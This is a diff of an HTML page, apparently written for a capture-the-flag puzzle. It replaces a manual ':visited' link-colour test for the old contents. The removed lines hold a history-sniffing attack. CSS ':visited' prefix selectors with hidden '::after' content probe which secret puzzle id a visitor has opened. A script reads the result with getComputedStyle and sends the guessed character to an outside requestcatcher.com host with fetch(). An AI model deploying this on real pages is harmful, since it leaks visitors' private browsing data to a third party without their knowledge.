@@ -1,57 +1,23 @@
 <!DOCTYPE html>
-<html>
+<html lang="en">
 <head>
+  <meta charset="UTF-8">
+  <title>:visited prefix test</title>
   <style>
-    a { color: black; display: block; padding: 5px; position: relative; }
-    
-    /* Test first character using ::after pseudo-element */
-    a[href^="http://34.146.134.179:3000/puzzle?id=0"]:visited::after { content: "FOUND"; position: absolute; left: -9999px; }
-    a[href^="http://34.146.134.179:3000/puzzle?id=1"]:visited::after { content: "FOUND"; position: absolute; left: -9999px; }
-    a[href^="http://34.146.134.179:3000/puzzle?id=2"]:visited::after { content: "FOUND"; position: absolute; left: -9999px; }
-    a[href^="http://34.146.134.179:3000/puzzle?id=3"]:visited::after { content: "FOUND"; position: absolute; left: -9999px; }
-    a[href^="http://34.146.134.179:3000/puzzle?id=4"]:visited::after { content: "FOUND"; position: absolute; left: -9999px; }
-    a[href^="http://34.146.134.179:3000/puzzle?id=5"]:visited::after { content: "FOUND"; position: absolute; left: -9999px; }
-    a[href^="http://34.146.134.179:3000/puzzle?id=6"]:visited::after { content: "FOUND"; position: absolute; left: -9999px; }
-    a[href^="http://34.146.134.179:3000/puzzle?id=7"]:visited::after { content: "FOUND"; position: absolute; left: -9999px; }
-    a[href^="http://34.146.134.179:3000/puzzle?id=8"]:visited::after { content: "FOUND"; position: absolute; left: -9999px; }
-    a[href^="http://34.146.134.179:3000/puzzle?id=9"]:visited::after { content: "FOUND"; position: absolute; left: -9999px; }
-    a[href^="http://34.146.134.179:3000/puzzle?id=a"]:visited::after { content: "FOUND"; position: absolute; left: -9999px; }
-    a[href^="http://34.146.134.179:3000/puzzle?id=b"]:visited::after { content: "FOUND"; position: absolute; left: -9999px; }
-    a[href^="http://34.146.134.179:3000/puzzle?id=c"]:visited::after { content: "FOUND"; position: absolute; left: -9999px; }
-    a[href^="http://34.146.134.179:3000/puzzle?id=d"]:visited::after { content: "FOUND"; position: absolute; left: -9999px; }
-    a[href^="http://34.146.134.179:3000/puzzle?id=e"]:visited::after { content: "FOUND"; position: absolute; left: -9999px; }
-    a[href^="http://34.146.134.179:3000/puzzle?id=f"]:visited::after { content: "FOUND"; position: absolute; left: -9999px; }
+    a {
+      color: black;
+      text-decoration: none;
+    }
+    a[href^="http://34.146.134.179:3000/puzzle?id="]:visited {
+      color: red;
+    }
   </style>
 </head>
 <body>
-  <script>
-    setTimeout(() => {
-      const links = document.querySelectorAll('a');
-      let found = '';
-      links.forEach(link => {
-        const after = getComputedStyle(link, '::after');
-        if (after.content === '"FOUND"') {
-          found = link.textContent;
-        }
-      });
-      fetch(`https://singetu0096.requestcatcher.com/?first_char=${found || 'none'}`);
-    }, 1000);
-  </script>
-  <a href="http://34.146.134.179:3000/puzzle?id=0000000000000000000000000000000000000000">0</a>
-  <a href="http://34.146.134.179:3000/puzzle?id=1000000000000000000000000000000000000000">1</a>
-  <a href="http://34.146.134.179:3000/puzzle?id=2000000000000000000000000000000000000000">2</a>
-  <a href="http://34.146.134.179:3000/puzzle?id=3000000000000000000000000000000000000000">3</a>
-  <a href="http://34.146.134.179:3000/puzzle?id=4000000000000000000000000000000000000000">4</a>
-  <a href="http://34.146.134.179:3000/puzzle?id=5000000000000000000000000000000000000000">5</a>
-  <a href="http://34.146.134.179:3000/puzzle?id=6000000000000000000000000000000000000000">6</a>
-  <a href="http://34.146.134.179:3000/puzzle?id=7000000000000000000000000000000000000000">7</a>
-  <a href="http://34.146.134.179:3000/puzzle?id=8000000000000000000000000000000000000000">8</a>
-  <a href="http://34.146.134.179:3000/puzzle?id=9000000000000000000000000000000000000000">9</a>
-  <a href="http://34.146.134.179:3000/puzzle?id=a000000000000000000000000000000000000000">a</a>
-  <a href="http://34.146.134.179:3000/puzzle?id=b000000000000000000000000000000000000000">b</a>
-  <a href="http://34.146.134.179:3000/puzzle?id=c000000000000000000000000000000000000000">c</a>
-  <a href="http://34.146.134.179:3000/puzzle?id=d000000000000000000000000000000000000000">d</a>
-  <a href="http://34.146.134.179:3000/puzzle?id=e000000000000000000000000000000000000000">e</a>
-  <a href="http://34.146.134.179:3000/puzzle?id=f000000000000000000000000000000000000000">f</a>
+  <h2>:visited prefix match test</h2>
+  <p>Click the link below, then reload this page. If it turns red, the test is successful.</p>
+  <a href="http://34.146.134.179:3000/puzzle?id=779b03b4719fec2daeffddc6762c0eef">
+    http://34.146.134.179:3000/puzzle?id=779b03b4719fec2daeffddc6762c0eef
+  </a>
 </body>
 </html>
